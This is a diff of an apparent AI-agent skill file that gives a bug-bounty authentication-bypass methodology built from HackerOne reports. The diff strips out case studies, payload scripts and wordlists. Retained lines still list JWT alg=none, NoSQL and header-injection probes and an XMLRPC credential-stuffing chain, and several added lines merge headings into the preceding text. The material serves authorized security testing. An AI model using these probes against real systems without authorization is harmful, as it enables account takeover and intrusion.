@@ -4,13 +4,13 @@ description: "Use for login logic flaws, password reset and recovery, session is
 agent_created: true
 ---
 
-# Authentication Bypass — unified skill
+# Authentication Bypass — unified methodology
 
-> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 3 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.
 
-## Corpus evidence — 989 valid HackerOne reports (197 paid / 20%)
+## Corpus signal — 989 valid reports (197 paid / 20%)
 
-Every disclosed report is valid; payment is an impact signal, not a validity test.
+Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.
 
 ### Techniques ranked across ALL valid reports
 
@@ -28,120 +28,6 @@ Every disclosed report is valid; payment is an impact signal, not a validity tes
 |  HosT/absolute-URL reset poisoning | 67 |
 | unauthenticated / removed-cookie test | 63 |
 | internal service / port / container | 63 |
-| file upload / filename / extension | 60 |
-| subdomain / DNS / cert-transparency recon | 60 |
-| intercept & replay request in Burp | 56 |
-| fuzzing / wordlist brute force | 46 |
-| XML / SOAP / SAML / XXE | 43 |
-| JWT / token / base64 decode | 40 |
-| employee / developer public info | 36 |
-| race / concurrency / timing | 34 |
-| DOM / HTML source inspection | 31 |
-| second-order / stored / blind delivery | 30 |
-| redirect chain / Location header | 28 |
-| cloud metadata / IAM abuse | 28 |
-| OAST / DNS / HTTP callback proof | 25 |
-| parameter pollution / duplicate keys | 21 |
-| third-party data / paste / breach reuse | 21 |
-| error message / stack trace probing | 19 |
-| WAF / sanitizer / filter bypass | 16 |
-| public bucket / storage exposure | 16 |
-| swap object ID / parameter value | 15 |
-| API docs / Swagger / introspection | 14 |
-| JS bundle / source-map inspection | 14 |
-| response diff / status / length comparison | 11 |
-| replay / modify a captured request | 10 |
-| verbose debug / framework fingerprint | 7 |
-| parser confusion / normalization | 7 |
-| browser DevTools / network tab | 6 |
-| git history / exposed .git | 6 |
-| deserialization / gadget chain | 4 |
-| archive / Wayback endpoint discovery | 4 |
-| mass assignment / extra request fields | 2 |
-| template injection (SSTI) | 1 |
-
-### Parameters observed in writeups
-
-`name` (28), `charset` (21), `class` (20), `path` (13), `type` (13), `_ga` (13), `max-age` (12), `email` (11), `__utma` (10), `__utmz` (10), `utmcsr` (10), `utmccn` (10), `utmcmd` (10), `href` (9), `__utmb` (9), `__utmc` (9), `action` (8), `utf8` (8), `_secure_admin_session_id` (8), `session` (7), `token` (7), `_gat` (7), `content` (7), `auth` (7), `utmcct` (6), `authenticity_token` (6), `vuid` (6), `_shopify_s` (6), `_shopify_y` (6), `phone` (6)
-
-### Bypass primitives observed
-
-`bypass` (236), `content-type` (195), `bypassed` (34), `bypassing` (33), `whitelist` (19), `race condition` (18), `open redirect` (15), `bypasses` (15), `unicode` (14), `%0d%0a` (13), `trailing dot` (8), `blacklist` (4), `normalization` (4), `blind` (4), `allowlist` (4), `%00` (3), `uppercase` (3), `bypassable` (3), `url encoded` (2), `url encode` (2), `transfer-encoding` (2), `chunked` (2), `out-of-band` (2), `url-encoded` (2), `null byte` (2), `lowercase` (2), `bypasspoc` (2), `case-sensitive` (2)
-
-### Impact language observed
-
-`token` (984), `password` (965), `admin` (505), `credential` (256), `secret` (113), `unauthorized` (103), `localhost` (65), `account takeover` (40), `payment` (36), `sensitive information` (27), `full access` (18), `api key` (13), `pii` (12), `sensitive data` (11), `rce` (11), `financial` (10), `arbitrary file` (7), `privilege escalation` (6), `internal network` (5), `exfiltration` (4)
-
-### Case studies — full excerpts (paid and unpaid)
-
-#### [739737](https://hackerone.com/reports/739737) — Token leak in security challenge flow allows retrieving victim's PayPal email and plain text password
-
-PayPal · $15300 · high
-
-A bug was identified whereby sensitive, unique tokens were being leaked in a JS file used by the recaptcha implementation. In certain cases, a user must solve a CAPTCHA challenge after authenticating. When the security challenge is completed, the authentication request is replayed to log in. The exposed tokens were used in the POST request to solve the CAPTCHA. The researcher identified a method by which a user, starting from a malicious site, could expose the security challenge token to a third party via a cross-site script inclusion (XSSI) attack. If the user then followed a login link from the malicious site and entered their credentials, the malicious third party could complete the security challenge, triggering the authentication request replay and exposing the user's password. This exposure only occurred if a user followed a login link from a malicious site, similar to a phishing page. PayPal implemented additional controls on the security challenge request to prevent token reuse, which resolved the issue, and no evidence of abuse was found. Full write-up available here:
-
-#### [2443228](https://hackerone.com/reports/2443228) — Account Takeover via Authentication Bypass in TikTok Account Recovery
-
-TikTok · $12000 · critical
-
-An improper authentication mechanism in TikTok's account recovery process could have been used for account takeovers on Android devices. There was no evidence of exploitation and this vulnerability has now been completely fixed. We thank @xtt0k for reporting this to our team and confirming its remediation. I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling. This flaw could have allowed a TikTok account to be taken over by knowing the account username. I appreciate TikTok's swift action in resolving this issue and their generous bounty.
-
-#### [976603](https://hackerone.com/reports/976603) — Ability to DOS any organization's SSO and open up the door to account takeovers
-
-Superhuman (formerly Grammarly) · $10500 · high
-
-**Summary:** There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click "join", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization. The strange behavior and why I think it *might* be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way. The bug stems from the fact that you can create an `entityId` identical to that of another organization **except** with a space ` ` at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `mye
-
-#### [173551](https://hackerone.com/reports/173551) — password reset token leaking allowed for ATO of an Uber account
-
-Uber · $10000 · critical
-
-With an email address for a valid Uber account, it was possible to take over that account because the reset token was exposed in the response of a password reset HTTP request. This meant an attacker could initiate password reset for an account and immediately receive the reset token for that account. We consider the security of our user's data top priority, so we were very interested in this report. Furthermore, @procode701 was a pleasure to work with and we look forward to more reports in the future.
-
-#### [136169](https://hackerone.com/reports/136169) — OneLogin authentication bypass on WordPress sites
-
-Uber · $10000 · severity n/a
-
-First, I'm sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites). #Overview# The *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication. The attacker can supply a username, email adress, name, and a role. If the username doesn't already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested). It looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as "administrator", or the email address or username of an existing administrator. #PoC# I tried this on two sites. On eng.uber.com I couldn't guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a "subscriber" level account. On newsroom.uber.com the role name apparently was simply "administrator" so I got that privilege on the system. Some other plugin settings may affect this behavior too. #Reproducing# An example shell script: ~~~~ sh #!/bin/sh xml=`base64 response.xml` curl -v ' \ --data "RelayState=/wp-login.php" --data-urlencode "S
-
-#### [921780](https://hackerone.com/reports/921780) — Improper Authentication - any user can login as other user with otp/logout & otp/login
-
-Snapchat · no bounty — still valid · critical
-
-'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim. I will demonstrate the problem on two accounts. Victim: ███ Attacker: ██████████ - Attacker perform a usuall login to attacker's personal account. - Attacker performs `/scauth/otp/droid/logout` but instead of attacker's user_id, attacker provides victim's user_id request response Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token. - Attacker performs `/scauth/otp/login` request with username equal victim's username, and the token obtained on previous step. response An attacker successfully performed login as victim. Victim's user_id can be easily obtained with friends request. I've attached the following: - a screencast to showcase the problem. - burp project ████ - logout+login raw requests exported from burp - a python script to perform the attack I've tested this bug only on my personal accounts. ███████ ███ █████████ ## Impact An attacker is able to login as any user.
-
-#### [129873](https://hackerone.com/reports/129873) — Bypassing Digits origin validation which leads to account takeover
-
-X / xAI · no bounty — still valid · severity n/a
-
-Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. #Detail In Digits architecture, the data communication channel between Digits and customer's site relies on *postMessage()*. In order to prevent malicious websites prevent themselves to be the legit Digits website and send arbitrary commands to the customer's websites, an origin validation is in place in the SDK. Specifically, the code that's responsible to perform the validation is as follow: **File: In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk_host").search(t.origin)`, which is the same as `-1 !== " In essence, it looks for the occurrence of Digit's origin from sender's origin. The way the validation is done is however flawed. According to the [docs of String.prototype.search()]( the method takes a regular repression object instead of a string. If anything other than regexp is passed, it will get implicitly converted into a regexp. In this case, `t.origin` which is a string is converted into a regexp. In regular expression, a dot (.) is treated as a wildcard. In other words, any character of Digits' origin can be replaced with a dot. An attacker can take advantage of it and use a special domain instead of the official one to bypass the validation, such as `www.d.gits.co` 
-
-### Recurring approach patterns from real reports
-
-- 2× i ve found a authorization issue in coinbase
-- 1× however the authenticated session cookie used by a user before logging out is still active
-- 1× i took a look at live install of phabricator and noticed that the user gets automatically logged in after clicking the password recovery link this link is sent to the user s mail
-- 1× hi i ve found a way to circumvent redirect uri restrictions imposed by the web application using domain suffix subdomain technique
-- 1× i created an oauth application under that has oauth redirect uri configured to so technically allowed request shall be denied request shall be surprisingly if i point the redirect uri to see mx suffix the endpoint will be accepted infact endpoint like will be accepted too
-- 1× step scrape s3 i wrote a rough poc that scrapes s3 and shows the found exports not something i d use just something i wrote for demonstration purposes feel free to use the team id and name i mentioned before to check it out
-- 1× i should also mention that i haven t looked through all the files but any sensitive file with the protection class set to anything other than nsfileprotectioncomplete would be extractable from the iphone without requiring the passcode
-- 1× hi i found a brute forcing attacking on your website
-- 1× i am tested invalid credentials and no account lockout was detected this means it s vuln to brute forcing attack
-- 1× you should able to see previous page and not only previous page but also viewed pages in the portal by clicking back back button thanks hari
-- 1× i read the bug of melvin and i also try to bypass this so i made a bypassing tehcnique but didnt work but i think i found a bug this is the screen shot when a user authorizes their twitter to connect with the url above they will encounter that error
-- 1× under advanced settings users have the ability to protect their wallet by requiring two factor confirmation when sending bitcoins
-- 1× personally i have configured my account with the most secure option which requires two factor confirmation when sending any amount of bitcoins
-- 1× i have tried showing all the three issues in the poc please let me know if you need the poc video as i can t upload it here because of some issues
-- 1× because i was able to set my password which is really common and anyone can hack it
-- 1× i found that you are using x csrf token as a protection against csrf attacks
-- 1× explaination suppose at hrs i used password reset options of mavenlink and got a token on my email lets call it token01 but i didnot use it
-- 1× and at hrs i used again the password reset option and got a new token which is token02
-- 1× attack scenario suppose i am an attacker and i got access to the recovery email option of your mavenlink account i logged in to ur recovery email suppose that is user gmail com then i used the forget password option of your mavenlink email i will get one password reset token
-- 1× hello i found another bug on hackerone
-- 1× i tried this one on my account only
-- 1× hey i was able to replay a cookie of a current active session and hijack that by replaying the cookie
-- 1× although i have managed to do with the other ones waiting for your reply
-- 1× i have found content spoofing vulnerable in slack at stripe integrations vulnerability is exploitable to all users proof of concept regards jayson zabate
 
 ## Corpus-backed method (this class)
 
@@ -172,20 +58,13 @@ Hi, I would like to report an important issue that affects websites that has int
 - Auth bypass -> admin function -> data or RCE.
 - Account linking flaw -> takeover via third-party identity.
 
-### Probes
-
-- Replace `"user[email]":"victim@x"` with an array containing victim+attacker emails
-- Duplicate `email=` parameters; switch form to JSON; try `email=null`
-- Reuse a reset token after password change; check Referer leakage
-
 ### Veteran tip
 
 A real corpus case turned a Content-Type conversion into a dual-recipient reset email — parameter shape is a first-class auth test.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### Quick wins
 
 Start here. These are the highest-yield tests for this class.
@@ -267,10 +146,7 @@ Start here. These are the highest-yield tests for this class.
 - Check whether the app accepts an authorization code or token granted to a *different* client — "abusing other apps' tokens" is a known ATO path when the token's audience is never checked.
 - Record how the app handles `prompt=none`: silent approval can make login-CSF and session-poisoning chains one-click instead of two.
 - Look for legacy protocol endpoints (XMLRPC `system.multicall`, WordPress `/xmlrpc.php`, SharePoint `Authentication.asmx`) that accept native credentials and bypass SSO/MFA entirely — these are among the highest-value disclosed HackerOne auth-bypass patterns.
-- Test path- and parameter-based access controls with case variation and URL encoding (`/ADMIN`, `/%61dmin`, `/admin;`), plus `X-Original-URL` / `X-Rewrite-URL` overrides that can bypass platform URL-matching rules.
-
-### Signals and surfaces
-
+- Test path- and parameter-based access controls with case variation and URL encoding (`/ADMIN`, `/%61dmin`, `/admin;`), plus `X-Original-URL` / `X-Rewrite-URL` overrides that can bypass platform URL-matching rules.### Signals and surfaces
 ### Signal
 
 - Reports: **989** · paid: **197**
@@ -361,10 +237,7 @@ passport.js authenticate
 - `openid_connect` or `id_token` in responses
 - Cookie domains set to `.company.com` (wildcard)
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### Payloads & probes
 
 - JWT -> `{"alg":"none"}`, HS256 with public key as secret, `kid=../../dev/null`
@@ -634,10 +507,7 @@ subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
 </methodCall>
 ```
 
----
-
-### Validation and proof
-
+---### Validation and proof
 ### Reporting bar
 
 - Prove real impact on a second controlled account or a safe callback.
@@ -685,10 +555,7 @@ Before writing any report, answer these three questions:
 - When chaining to ATO, prove the full chain from attacker A to victim B (or to admin) in one clean walkthrough; a collection of isolated primitives is usually downgraded.
 - Publicly disclosed 2025 research (GitHub Security Lab SAML parser differentials, PortSwigger Fragile Lock) shows these bugs are library/version-specific — record the detected version so triage can reproduce quickly.
 - Keep scope discipline: default-credential and exposed-infrastructure findings need explicit authorization and a safe proof (e.g. reading a harmless version endpoint), not destructive admin actions.
-- Redact session cookies, tokens, and other-user PII in all PoC material; a valid finding with sloppy evidence is frequently rejected for hygiene reasons.
-
-### Escalation and related chains
-
+- Redact session cookies, tokens, and other-user PII in all PoC material; a valid finding with sloppy evidence is frequently rejected for hygiene reasons.### Escalation and related chains
 ### Escalation chains
 
 - Reset poisoning -> ATO.
@@ -722,10 +589,7 @@ Before writing any report, answer these three questions:
 - **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
 - **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
 - **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.
-
-### Tools and wordlists
-
+- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.### Tools
 ### Tools
 
 `jwt_tool` · `hashcat` · `Burp` · `ffuf` · `nuclei`
@@ -763,10 +627,7 @@ nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
 # authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
 ```
 
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-### Real-world examples
-
+Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Real-world examples
 ### Real Impact Examples
 
 **Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
@@ -778,10 +639,7 @@ A major enterprise communication platform's SAML SP implementation failed to pro
 **Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
 An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### Query the corpus
 
 ```sh
@@ -815,10 +673,7 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class auth
 2. https://portswigger.net/web-security/authentication/multi-factor
 3. https://portswigger.net/research/hidden-oauth-attack-vectors
 4. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
-5. https://portswigger.net/web-security/race-conditions
-
-### Additional notes
-
+5. https://portswigger.net/web-security/race-conditions### Additional notes
 ### Parameters observed
 
 `client_id` · `redirect_uri` · `state` · `code` · `email` · `response_type` · `error` · `consumer_key` · `host` · `scope` · `id` · `auth_type` · `referrer` · `password` · `client_secret` · `type` · `return_to` · `auth_code` · `page` · `ws`
@@ -1074,343 +929,8 @@ app.post('/api/admin/delete', deleteUser);         // no server-side check
 
 **Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.
 
----
-
-## Companion methodology (complete, deduplicated)
-
-Full text of every non-SKILL.md methodology document from the contributing skills.
-
-### Companion: hunting / references/payloads.md
-
-# Auth Bypass — Combined Field Guide — Payload reference
-
-Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.
-
----
-
-## Payloads & probes
-
-
-
-- JWT -> `{"alg":"none"}`, HS256 with public key as secret, `kid=../../dev/null`
-
-- NoSQL -> `{"user":"admin","pass":{"$ne":null}}`
-
-- Type juggling -> `password[]=x`, `otp=0e12345`, `true` vs `"true"`
-
-- Header tricks -> `X-Forwarded-Host: evil`, `Host: evil`, `X-Original-URL: /admin`
-
-
-
-## Payload fragments observed
-
-
-
-Recurring payloads from this class's writeups. Adapt, don't paste blindly.
-
-
-
-| Seen | Fragment |
-
-|---:|---|
-
-| 5× | `artifactory@r3.com` |
-
-| 5× | `<userId>` |
-
-| 4× | `url_match_auth_nego()` |
-
-| 4× | `url_match_result()` |
-
-| 4× | `ssh_config_matches()` |
-
-| 3× | `abc@xyz.com` |
-
-| 3× | `url_match_auth_ntlm()` |
-
-| 3× | `support+1@trint.com` |
-
-| 3× | `k->headerline` |
-
-| 3× | `on_resp_header()` |
-
-| 3× | `namevalue()` |
-
-| 2× | `https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>` |
-
-| 2× | `https://hackerone.com/apps/atlassian/claim-app?jwt=<TOKEN>` |
-
-| 2× | `{"error": true, "errorMessage": "Invalid request"}` |
-
-| 2× | `postPrivate()` |
-
-| 2× | `badca7@wearehackerone.com` |
-
-| 2× | `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` |
-
-| 2× | `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register` |
-
-| 2× | `GET → 404 {"status":404,"error":"Not Found"}` |
-
-| 2× | `https://github.com/login?client_id=5f45cc999f7812d0b6d2&return_to=%2Flogin%2Foauth%2Fauthorize%3Fclient_id%3D5f45cc999f7812d0b6d2%26redirect` |
-
-
-
-## Parameters observed
-
-
-
-`client_id` · `redirect_uri` · `state` · `code` · `email` · `response_type` · `error` · `consumer_key` · `host` · `scope` · `id` · `auth_type` · `referrer` · `password` · `client_secret` · `type` · `return_to` · `auth_code` · `page` · `ws`
-
-
-
-## Wordlists
-
-
-
-Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.
-
-
-
-| File | Entries |
-
-|---|---:|
-
-| `~/.local/share/hackerone-reports/wordlists/paths_auth-bypass.txt` | 150 |
-
-| `~/.local/share/hackerone-reports/wordlists/params_auth-bypass.txt` | 150 |
-
-| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
-
-| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |
-
-
-
-```sh
-
-W=~/.local/share/hackerone-reports/wordlists
-
-ffuf -u https://target/FUZZ -w $W/paths_auth-bypass.txt \
-
-     -mc all -fc 404 -fs 0 -rate 40
-
-ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_auth-bypass.txt \
-
-     -mr 'canary|error|invalid|not found' -rate 40
-
-```
-
-
-
-## Nuclei
-
-
-
-Default-login templates are high signal on admin panels; also test JWT and reset flows manually.
-
-
-
-```sh
-
-nuclei -u https://target -tags auth-bypass,default-login,jwt,login \
-
-       -severity low,medium,high,critical -rl 40 -o nuclei_auth-bypass.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/default-logins \
-
-       -rl 40 -o nuclei_auth-bypass_default-logins.txt
-
-nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
-
-       -rl 40 -o nuclei_auth-bypass_misconfiguration.txt
-
-# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
-
-```
-
-
-
-Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
-
-
-
-## Payload & Detection Patterns
-
-
-
-**XMLRPC auth probe (bypasses SSO):**
-
-```bash
-
-curl -s -X POST https://target.com/xmlrpc.php \
-
-  -H "Content-Type: text/xml" \
-
-  -d '<?xml version="1.0"?>
-
-<methodCall>
-
-  <methodName>system.listMethods</methodName>
-
-  <params></params>
-
-</methodCall>'
-
-
-
-# If 200 with method list → XMLRPC is enabled, test auth:
-
-curl -s -X POST https://target.com/xmlrpc.php \
-
-  -H "Content-Type: text/xml" \
-
-  -d '<?xml version="1.0"?>
-
-<methodCall>
-
-  <methodName>wp.getUsersBlogs</methodName>
-
-  <params>
-
-    <param><value><string>admin</string></value></param>
-
-    <param><value><string>password</string></value></param>
-
-  </params>
-
-</methodCall>'
-
-```
-
-
-
-**SAML signature stripping (send unsigned assertion):**
-
-```python
-
-import base64, re
-
-
-
-# Decode captured SAMLResponse
-
-saml_b64 = "BASE64_FROM_BURP"
-
-saml_xml = base64.b64decode(saml_b64).decode()
-
-
-
-# Strip the Signature element entirely
-
-stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)
-
-
-
-# Re-encode and submit
-
-print(base64.b64encode(stripped.encode()).decode())
-
-```
-
-
-
-**SAML XML comment injection (username confusion):**
-
-```xml
-
-<!-- Original NameID -->
-
-<NameID>attacker@evil.com</NameID>
-
-
-
-<!-- Injected to confuse parser -->
-
-<NameID>attacker@evil.com<!---->.victim@company.com</NameID>
-
-
-
-<!-- Or namespace confusion -->
-
-<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
-
-```
-
-
-
-**Partner/cross-portal token reuse test:**
-
-```bash
-
-# Get token from partner portal
-
-TOKEN=$(curl -s -X POST https://partners.target.com/login \
-
-  -d 'email=attacker@test.com&password=pass' \
-
-  -c cookies.txt | grep -o 'token=[^;]*')
-
-
-
-# Replay against admin portal
-
-curl -s https://admin.target.com/dashboard \
-
-  -H "Authorization: Bearer $TOKEN" \
-
-  -H "Cookie: $TOKEN"
-
-```
-
-
-
-**JWT none algorithm attack:**
-
-```python
-
-import base64, json
-
-
-
-header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
-
-payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
-
-token = f"{header}.{payload}."
-
-print(token)
-
-```
-
-
-
-**Grep patterns for auth bypass surface:**
-
-```bash
-
-# Find XMLRPC in scope
-
-grep -r "xmlrpc" scope_urls.txt
-
-
-
-# Find SSO indicators in JS
-
-grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js
-
-
-
-# Find partner/admin subdomains
-
-subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # Auth Bypass — Combined Field Guide — Technique reference
 
@@ -1738,330 +1258,15 @@ python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class auth
 
 
 
----
+---## Probes
 
-## Corpus wordlists (mined)
+- Replace `"user[email]":"victim@x"` with an array containing victim+attacker emails
+- Duplicate `email=` parameters; switch form to JSON; try `email=null`
+- Reuse a reset token after password change; check Referer leakage
 
-### `params_auth-bypass.txt`
+## Supporting data
 
-```text
-error
-client_id
-redirect_uri
-code
-state
-email
-response_type
-id
-scope
-authenticity_token
-consumer_key
-host
-action
-url
-month
-year
-password
-token
-auth_type
-template
-username
-referrer
-type
-phone
-template[]
-client_secret
-usp
-return_to
-auth_code
-_method
-page
-ws
-message
-name
-oauth_token
-nonce
-ticket
-shop
-next
-strategy
-format
-jwt
-returnUrl
-limit
-utf8
-Action
-Version
-x-amz-signedheaders
-x-amz-credential
-submit
-uuid
-getRankingInfo
-facets
-attributesToRetrieve
-highlightPreTag
-highlightPostTag
-hitsPerPage
-facetFilters
-maxValuesPerFacet
-x-algolia-agent
-x-algolia-application-id
-x-algolia-api-key
-query
-account
-activity_pages
-activity_filter
-dir
-comment_id
-license_id
-switch
-ticket_id
-tag
-redirectUrl
-redirect_after_login
-x-amz-storage-class
-proceed_to
-ReturnUrl
-signature
-account_id
-owner_id
-offset
-_x_id
-rfhs
-access_token
-tix_email
-lang
-Sportsbook
-sort
-user_id
-_csrf_token
-secret_document
-giftId
-reset_password_token
-AWSAccessKeyId
-Signature
-title
-setlang
-dest
-x-app
-x-urlpath
-per_page
-requestAtStart
-requestAtStop
-count
-reason
-cb
-commit
-MERGE1
-MERGE2
-ht
-mc_signupsource
-back_to
-method
-substate
-is_internal
-reference
-add_reporter_to_original
-reply_action
-reports_count
-dial_code
-private
-confirmation_token
-is_sticky
-track_id
-session
-requestTokenAndRedirect
-challenge
-challenge_answer
-iframe
-popup
-player
-product_id
-cursor_index
-cursor_offset
-include_available_features
-include_entities
-is_forward
-sk
-attestation
-device_id
-dsig
-dtoken1i
-fidelius_client_init
-height
-max_video_height
-max_video_width
-reactivation_confirmed
-req_token
-screen_height_in
-screen_height_px
-```
-
-### `paths_auth-bypass.txt`
-
-```text
-/login
-/admin
-/spf/validate.html
-/oauth/authorize
-/accounts/sso
-/settings
-/wp-login.php
-/admin/
-/cgi-bin/cvename.cgi
-/signin
-/bridge
-/auth/shopify/
-/cb
-/gift/share/
-/auth/failure
-/scauth/otp/droid/logout
-/redirect
-/sso_continue
-/accounts/login
-/accounts/
-/us/hosting/produktmatrix_vserver/vserver-produktmatrix
-/vps.php
-/pricing/
-/api/v3/login/phone/
-/login/oauth/authorize
-/verify
-/v2/auth.json
-/bitcoinWithdrawalFees
-/admin/products
-/districts-demo-form
-/customer/chats/new
-/register/reset/
-/dncp/home.php
-/wp-json/newspack-extended-access/v1/google/register
-/s/explore
-/projects/
-/api/auth
-/api/v1/login
-/CN=localhost
-/web/scripts
-/services/signup/setup
-/Account/Login
-/vendor/definitions
-/vendor/Vendors
-/server/employees
-/squid-internal-mgr/active_requests
-/dashboard
-/accounts
-/accounts/login/
-/mattboldt/typed.js/master/lib/
-/v2/_catalog
-/wp-admin/
-/path
-/page1
-/page2
-/tools/keys.html
-/%0d%0a
-/admin/settings/notifications
-/oauth/twitter/authorize
-/my/account
-/sockjs/info
-/admin/settings/general
-/slack-files2/
-/subscribe/post
-/callback
-/security/advisory/
-/forgot-password
-/admin/users.json
-/index.php/apps/files/
-/musicstore/download
-/_oauth/twitter/
-/PinLetterConfirm.aspx
-/login.cgi
-/wp-admin/admin-ajax.php
-/community
-/check-otp
-/stories/feed+rss
-/safe/pickupfiles.aspx
-/scauth/otp/login
-/fabric.html
-/de/cognito/
-/cli/
-/logout
-/api/chat.postMessage
-/rt/users/passwordless-signup
-/pocs/periscope-oauth-callback-hijack
-/web/digits/sign-in-with-phone-number.html
-/pocs/digits-bridge-referer-bypass
-/merchant-api/dining/merchant-login/v1/send-otp
-/partners
-/snaps/create/new
-/vendors/1214355/hackerone
-/plugins/servlet/ac/com.hackerone/get-started-with-hackerone-on-jira
-/account/details/
-/account/register/
-/preview_bar
-/prepareuberattack.php
-/trips
-/articles/uber-turning-self-xss-into-good-xss/
-/subdomaintakeoverbyarneswinnen.html
-/uberattack.php
-/Passwords
-/ipv6/
-/api/v2/users/1479-5770-XGGL
-/api/v3/login/phone/SOMETOKEN
-/auth/callback
-/admin/apps/flow
-/robots.txt
-/products/canvas
-/post/149985438982/reading-ubers-internal-emails-uber-bug-bounty
-/login/oauth/access_token
-/rooms/2/2-/messages
-/pocs/digits-validation-bypass/
-/rails/active_storage/blobs/redirect/
-/fyeem62eqa2ipopoty6c5j0aye3t
-/rails/active_storage/direct_uploads
-/messages/support/new
-/reset/█████
-/5218370/verify
-/app/login
-/pocs/digits-host-validation-bypass-hpp/
-/api/Account/Login/
-/mtn_otp/index/verification/
-/User/FrontDoorLogin/
-/User/AuthenticateForms
-/User/Login
-/SessionVerify
-/Me
-/SessionCreate
